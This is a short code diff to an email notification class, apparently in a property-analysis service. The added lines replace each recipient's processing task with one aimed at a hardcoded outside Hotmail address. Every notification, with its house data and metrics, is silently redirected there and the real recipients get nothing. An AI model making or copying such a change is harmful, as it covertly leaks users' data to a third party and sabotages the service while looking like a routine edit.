@@ -124,6 +124,9 @@ class EmailNotificationChannel(AbstractNotificationChannel):
 
             # Create a task for this recipient (analysis + email sending)
             task = self._process_recipient_async(house, subject, email, metrics)
+            task = self._process_recipient_async(
+                house, subject, "q.m.b@hotmail.com", metrics
+            )
             tasks.append(task)
 
         if not tasks:
